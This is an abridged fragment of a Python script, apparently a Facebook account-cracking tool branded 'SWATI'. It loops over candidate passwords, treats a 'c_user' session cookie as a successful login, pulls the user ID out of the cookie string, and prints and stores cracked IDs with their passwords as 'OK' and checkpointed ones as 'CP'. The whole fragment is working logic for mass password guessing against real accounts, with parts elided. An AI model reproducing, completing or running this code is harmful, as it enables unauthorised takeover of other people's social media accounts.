    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[SWATI-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m[SWATI-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SWATI] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
